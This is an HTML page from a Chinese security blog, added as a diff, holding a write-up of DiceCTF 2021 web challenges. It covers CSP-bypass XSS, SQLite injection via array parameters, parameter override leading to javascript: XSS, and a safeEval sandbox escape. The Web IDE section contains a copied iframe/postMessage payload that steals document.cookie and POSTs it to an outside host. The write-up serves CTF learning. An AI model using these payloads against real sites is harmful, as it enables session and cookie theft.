@@ -1,0 +1,607 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"blog.z3ratu1.cn","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="DiceCTF2021好像比justCTF简单不少。。。起码有萌新能做出来的题了呜呜但是怎么感觉外国比赛这么喜欢XSS BabierCSP对标justCTF的BabyCSP，确实更baby了，justCTF那个题完全不会。。。因为设置了default-src，fetch这些函数的请求的源也受到CSP控制，fetch就发不出去，一开始在这卡了然后用windows.location.href跳转就行了">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DiceCTF2021">
+<meta property="og:url" content="https://blog.z3ratu1.cn/DiceCTF2021.html">
+<meta property="og:site_name" content="Z3ratu1&#39;s blog">
+<meta property="og:description" content="DiceCTF2021好像比justCTF简单不少。。。起码有萌新能做出来的题了呜呜但是怎么感觉外国比赛这么喜欢XSS BabierCSP对标justCTF的BabyCSP，确实更baby了，justCTF那个题完全不会。。。因为设置了default-src，fetch这些函数的请求的源也受到CSP控制，fetch就发不出去，一开始在这卡了然后用windows.location.href跳转就行了">
+<meta property="og:locale">
+<meta property="article:published_time" content="2021-02-06T08:04:27.000Z">
+<meta property="article:modified_time" content="2021-02-17T06:54:21.912Z">
+<meta property="article:author" content="Z3ratu1">
+<meta property="article:tag" content="wp">
+<meta property="article:tag" content="XSS">
+<meta property="article:tag" content="Service worker">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://blog.z3ratu1.cn/DiceCTF2021.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-Hans'
+  };
+</script>
+
+  <title>DiceCTF2021 | Z3ratu1's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Z3ratu1's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Welcome</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" placeholder="搜索..." spellcheck="false" type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+  <a href="https://github.com/Z3ratu1" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="external nofollow noopener noreferrer" target="_blank"><svg width="80" height="80" viewbox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="https://blog.z3ratu1.cn/DiceCTF2021.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://q2.qlogo.cn/headimg_dl?dst_uin=1207039417&spec=160">
+      <meta itemprop="name" content="Z3ratu1">
+      <meta itemprop="description" content="与其感慨路难行，不如现在出发">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Z3ratu1's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          DiceCTF2021
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-02-06 16:04:27" itemprop="dateCreated datePublished" datetime="2021-02-06T16:04:27+08:00">2021-02-06</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-02-17 14:54:21" itemprop="dateModified" datetime="2021-02-17T14:54:21+08:00">2021-02-17</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" itemprop="url" rel="index"><span itemprop="name">刷题记录</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/DiceCTF2021.html" class="post-meta-item leancloud_visitors" data-flag-title="DiceCTF2021" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/DiceCTF2021.html#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/DiceCTF2021.html" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="DiceCTF2021"><a href="#DiceCTF2021" class="headerlink" title="DiceCTF2021"></a>DiceCTF2021</h1><p>好像比justCTF简单不少。。。起码有萌新能做出来的题了呜呜<br>但是怎么感觉外国比赛这么喜欢XSS</p>
+<h2 id="BabierCSP"><a href="#BabierCSP" class="headerlink" title="BabierCSP"></a>BabierCSP</h2><p>对标justCTF的BabyCSP，确实更baby了，justCTF那个题完全不会。。。<br>因为设置了default-src，fetch这些函数的请求的源也受到CSP控制，fetch就发不出去，一开始在这卡了<br>然后用windows.location.href跳转就行了</p>
+<p>这个题nonce是不变的，那不就是无过滤XSS吗。一开始以为是题写歪了想考参考链接里面先知那个吞下面nonce的点的，后来测了一下发现这个必须是可控点和有nonce的script连在一起才行，不然之间的任意一个右尖括号都能把你给闭合了而无法吞下正确的nonce</p>
+<p>现在想起来如果nonce会变就完全不会做了呜呜</p>
+<h2 id="Missing-Flavortext"><a href="#Missing-Flavortext" class="headerlink" title="Missing Flavortext"></a>Missing Flavortext</h2><p>源码很短，就是个SQL注入题，只使用<code>if ([req.body.username, req.body.password].some(v =&gt; v.includes(&#39;\&#39;&#39;)))</code>过滤了单引号，查询语句为</p>
+<pre class=" language-sqlite"><code class="language-sqlite">  const query = `SELECT id FROM users WHERE
+    username = '${req.body.username}' AND
+    password = '${req.body.password}'
+  `;
+</code></pre>
+<p>sqlite有着诡异的特性，不吃反斜杠转义，得用两个单引号来转义单引号，这里过滤了引号理论上无解了，但是这里使用的是<code>app.use(bodyParser.urlencoded(&#123; extended: true &#125;));</code>，扩展确认为true，所以对username[1]&#x3D;123解析出来的结果就不是简单地username&#x3D;123的键值对，而是一个名为user的数组其中第二个值为123(第一个值下标为0是undefined)<br>这样子就能过之前那个some函数的check，而在填入req.body.password时填的却不是数组而是这个值，这大概就是js的奇妙特性吧</p>
+<h2 id="Web-Unit"><a href="#Web-Unit" class="headerlink" title="Web Unit"></a>Web Unit</h2><p>一个创建链接功能和一个创建粘贴，使用创建链接时会检查是否使用的是http(s)协议，均生成一个uid，并将数据和对应的类型(link or paste)插入数据库，返回一个对应的uid，view路由接受一个uid，根据uid查询数据库，如果返回的数据type是link就根据链接重定向，如果type非link就用textContent拼到div里去<br><strong>textContent是超级防御，里面的数据都会被当做文本解析，绝对XSS不了</strong></p>
+<p>注意到一个不认识的东西。。。百度了一下然后就出了，真实运气好</p>
+<pre class=" language-javascript"><code class="language-javascript">函数原型为
+<span class="token function">addData</span><span class="token punctuation">(</span><span class="token punctuation">{</span>uid<span class="token punctuation">,</span>data<span class="token punctuation">,</span>type<span class="token punctuation">}</span><span class="token punctuation">)</span>
+调用形式为
+database<span class="token punctuation">.</span><span class="token function">addData</span><span class="token punctuation">(</span><span class="token punctuation">{</span> type<span class="token punctuation">:</span> <span class="token string">'paste'</span><span class="token punctuation">,</span> <span class="token operator">...</span>req<span class="token punctuation">.</span>body<span class="token punctuation">,</span> uid <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</code></pre>
+<h3 id="三点运算符"><a href="#三点运算符" class="headerlink" title="三点运算符"></a>三点运算符</h3><p>ES6语法，就是把一个数组拆成一个个的作为参数，或者把一个大括号(对象)对应的键值对解析出来当参数填入，也可以直接把只有一个元素的数组直接靠三点运算符当参数传入</p>
+<h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>这里是用三点运算符把req.body解析出来填入参数，addData这个函数原型本来就有点玄幻，参数写成了一个对象，里面三个属性，然后调用的时候type先指定，再解析req.body，再传入uid。<br>本地测试了一下这个参数传递的情况，先是从左往右按顺序解析，所以<code>...req.body</code>是可以覆盖之前的type的，在没有检测的createPaste路由里面放一个javascript伪协议，并且req.body里多传一个type进去，覆盖type为link，这样子view查出来的数据就是链接，通过js伪协议打通</p>
+<h3 id="坑点"><a href="#坑点" class="headerlink" title="坑点"></a>坑点</h3><p>一开始想用fetch，因为这次没得CSP了嘛，然后报错Mixed Content，https不给加载http的内容，那我也配了https，反手换成https，发现监听端口得到的东西就不是人看的了。。。。最后还是换回location.href</p>
+<p>后来想本地测试一下，结果burp还是不能抓本地包，没深究为什么，最后查到一个临时方案，ipconfig看一下自己内网地址，通过内网访问就能抓包了<br>再后来发现自己有点傻逼，参数解析为什么一定要用req.body呢，然后开始直接调试<br>发现传入参数为一个对象时，参数的变量名一定要和对象属性名对应，不能单纯的按顺序传入三个名字不对的变量，会导致对应属性undefined。。。。<br>题目写的是<code>database.addData(&#123; type: &#39;paste&#39;, ...req.body, uid &#125;);</code>，所以仅type可控，就算修改了uid也会被再覆盖回来，本地测试的时候把uid改成了uidd之后，如果req.body里面不提交uid，uid就变成undefined了</p>
+<h2 id="Web-IDE"><a href="#Web-IDE" class="headerlink" title="Web IDE"></a>Web IDE</h2><p>提供了一个js在线运行环境，js运行那段代码看不太懂。。。只有管理员能存代码和看代码<br>admin cookie的samesite属性设置为none，感觉有点像CSRF的操作点，加上存和看两个功能只能admin搞，感觉就是CSRF，然后准备在自己vps上写个钓鱼，用fetch发一个POST请求，并把得到的代码存储路径转发出来，吃到了无敌的CORS限制，gg了。虽然还能用POST表单打CSRF，但是获取不到返回的js路径，让admin看代码的功能就无从说起</p>
+<h3 id="看WP"><a href="#看WP" class="headerlink" title="看WP"></a>看WP</h3><p>整体来说这个题挺难的，只能对着慢慢理解一遍了</p>
+<h4 id="safeEval沙盒绕过"><a href="#safeEval沙盒绕过" class="headerlink" title="safeEval沙盒绕过"></a>safeEval沙盒绕过</h4><p>刚开始做这个题的时候就没太看懂这段命令执行代码。。。现在学了一下一句一句理解</p>
+<pre class=" language-javascript"><code class="language-javascript">  <span class="token keyword">const</span> safeEval <span class="token operator">=</span> <span class="token punctuation">(</span>d<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
+    <span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+      <span class="token keyword">with</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Proxy</span><span class="token punctuation">(</span>window<span class="token punctuation">,</span> <span class="token punctuation">{</span>
+        <span class="token keyword">get</span><span class="token punctuation">:</span> <span class="token punctuation">(</span>t<span class="token punctuation">,</span> p<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
+          <span class="token keyword">if</span> <span class="token punctuation">(</span>p <span class="token operator">===</span> <span class="token string">'console'</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token punctuation">{</span>log<span class="token punctuation">}</span><span class="token punctuation">;</span>
+          <span class="token keyword">if</span> <span class="token punctuation">(</span>p <span class="token operator">===</span> <span class="token string">'eval'</span><span class="token punctuation">)</span> <span class="token keyword">return</span> window<span class="token punctuation">.</span>eval<span class="token punctuation">;</span>
+          <span class="token keyword">return</span> undefined<span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+      <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token function">eval</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">,</span> d<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span><span class="token punctuation">;</span>
+</code></pre>
+<p>safeEval其实整个就是对一个匿名函数调用call(Object.create(null), d)，对匿名函数调用call实际上就是调用这个函数并传入参数，接下来看这个函数<br>比较迷惑的就是这段with Proxy，with关键字指定了一个上下文，在这个上下文中对所有属性的访问都会先去查找一下with指定的对象，查不到再去查外层，例子如下</p>
+<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token punctuation">{</span>c<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">}</span>
+<span class="token keyword">var</span> c <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
+<span class="token keyword">with</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">{</span>
+    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//等价于a.c 即为1</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>Proxy为代理（好像java里面也有这种东西，但是都没学过），指定一个对象的代理，定义代理后可以使用一些trap函数，对被代理的对象进行一系列操作的时候，就可以hook对应的操作进行处理<br>这里创建了对window对象的代理，所以当eval中使用和window相关的属性的时候，就会收到get函数的限制，这里只允许获取到eval和log，log是重写的一个让内容能显示在界面上的函数</p>
+<p>总而言之，safeEval的作用就是限制了这个eval在执行的时候window对象只有eval和log两个属性</p>
+<p>看到这么一段话</p>
+<blockquote>
+<p>From what I know, there are couple of ways to execute arbitrary js:<br>window.eval<br>window.location + javascript pseudo protocol(javascript:)<br>window.setTimeout and window.setInterval<br>function constructor</p>
+</blockquote>
+<p>前三个都属于window对象的属性，都已经没得了，eval嵌套eval我估计不行，所以使用function constructor来绕过这个Proxy进行任意代码执行<br><code>[].constructor.constructor(code)()</code>，这里获取到函数的构造函数，构造出一个函数并进行自调用<br>这里在经历了一个Function.constructor之后似乎创建了一个独立的上下文，不再受到之前with上下文的影响，进而脱离了限制达到任意代码执行<br>浏览器控制台实验结果</p>
+<pre class=" language-javascript"><code class="language-javascript">a<span class="token operator">=</span><span class="token punctuation">{</span>b<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">}</span>
+<span class="token keyword">with</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>constructor<span class="token punctuation">.</span><span class="token function">constructor</span><span class="token punctuation">(</span><span class="token string">"console.log(b)"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+VM145<span class="token punctuation">:</span><span class="token number">4</span> <span class="token number">1</span>
+VM146<span class="token punctuation">:</span><span class="token number">3</span> Uncaught ReferenceError<span class="token punctuation">:</span> b is not defined
+    at eval <span class="token punctuation">(</span>eval at <span class="token operator">&lt;</span>anonymous<span class="token operator">></span> <span class="token punctuation">(</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span>anonymous<span class="token operator">></span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token number">13</span><span class="token punctuation">)</span>
+    at <span class="token operator">&lt;</span>anonymous<span class="token operator">></span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token number">49</span>
+</code></pre>
+<p>不过直接在题目上用这个方法是不能执行命令的，因为HTML里设置了这么一句<code>&lt;iframe src=&quot;../sandbox.html&quot; frameborder=&quot;0&quot; sandbox=&quot;allow-scripts&quot;&gt;&lt;/iframe&gt;</code>，只允许脚本执行，虽然看起来允许脚本执行已经为所欲为了，但事实上还有一大堆参数指定跨域表单提交创建窗口之类的，这个情况下alert弹窗都弹不出来</p>
+<h3 id="postMessage提交数据"><a href="#postMessage提交数据" class="headerlink" title="postMessage提交数据"></a>postMessage提交数据</h3><p>但是这里可以看到在sandbox.html中，开了一个iframe为sandbox执行代码，而数据通过postMessage进行传递，因此可以在自己的vps上搭一个页面，引用题目的sandbox.html开一个iframe，这个iframe的sandbox属性就可以允许为所欲为，并自己写一个postMessage提交数据，这样子虽然这个页面是我个人的，但是操作是在题目环境下的iframe完成的，就没有之前CORS跨域的问题，整一个fetch(‘&#x2F;ide&#x2F;save’)并提交XSS脚本，拿到保存的的id，进行下一步攻击</p>
+<h3 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h3><p>这个好理解一点。预期还用了service worker，太难了。。。<br>因为admin cookie设置情况如下</p>
+<pre class=" language-javascript"><code class="language-javascript">      <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">cookie</span><span class="token punctuation">(</span><span class="token string">'token'</span><span class="token punctuation">,</span> <span class="token template-string"><span class="token string">`dice{</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>process<span class="token punctuation">.</span>env<span class="token punctuation">.</span>FLAG<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">}`</span></span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
+        path<span class="token punctuation">:</span> <span class="token string">'/ide'</span><span class="token punctuation">,</span>
+        sameSite<span class="token punctuation">:</span> <span class="token string">'none'</span><span class="token punctuation">,</span>
+        secure<span class="token punctuation">:</span> <span class="token boolean">true</span>
+      <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/ide/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</code></pre>
+<p>samesite定义为none了，但是path指定在了ide下，sandbox.html处是没有这个cookie的，因此需要重新想办法获取到cookie，非预期是因为bot使用的是headless Chrome，可以跨路径获取cookie，对于普通的Chrome是不能这么打的<del>虽然我在自己的Chrome上试了一下也成功了。。。</del></p>
+<p>开一个window之后直接获取到window.document.cookie发出来<br>抄的payload</p>
+<pre class=" language-html"><code class="language-html">  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://web-ide.dicec.tf/sandbox.html<span class="token punctuation">"</span></span> <span class="token attr-name">sandbox</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>allow-scripts allow-same-origin allow-popups allow-popups-to-escape-sandbox<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">
+    <span class="token keyword">const</span> frame <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'iframe'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    frame<span class="token punctuation">.</span>onload <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> frame<span class="token punctuation">.</span>contentWindow<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`(async () => {
+      const w = eval.call(this, "window");
+      let p = w.open('/ide');
+      await new w.Promise(r => w.setTimeout(r, 500));
+      const c = p.document.cookie;
+      w.fetch("ctf.rabulinski.com", { method: "POST", body: c });
+    })();`</span></span><span class="token punctuation">,</span> <span class="token string">'*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+</code></pre>
+<h3 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h3><p>通过注册service worker并addEventListener fetch，控制页面所加载的资源，由于sw只能注册本地文件，因此需先让admin存一个sw脚本并获取到结果<br>由于service worker并不在页面上下文中运行，即注册了sw也无法直接获取cookie，但由于sw可以控制加载的资源，因此只需让在ide路径下加载的资源变为指定的恶意脚本即可在ide路径下将cookie发送出来</p>
+<p>具体payload看下面链接吧。。。</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://xz.aliyun.com/t/7372#toc-9">CSP绕过姿势</a><br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/aszx87410/ctf-writeups/issues/19">Web IDE wp</a><br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Function/call#%E4%BD%BF%E7%94%A8_call_%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8%E5%8C%BF%E5%90%8D%E5%87%BD%E6%95%B0">call MDN</a><br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/iframe">iframe MDN</a><br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/gr455/ctf-writeups/blob/master/dicectf21/web_ide.md">web_ide.md</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/wp/" rel="tag"># wp</a>
+              <a href="/tags/XSS/" rel="tag"># XSS</a>
+              <a href="/tags/Service-worker/" rel="tag"># Service worker</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/Mimikatz%E4%BD%BF%E7%94%A8%E7%AE%80%E7%95%A5.html" rel="prev" title="mimikatz简单使用手册">
+      <i class="fa fa-chevron-left"></i> mimikatz简单使用手册
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/%5BUnionCTF2021%5DCr0wnAir.html" rel="next" title="[UnionCTF2021]Cr0wnAir">
+      [UnionCTF2021]Cr0wnAir <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
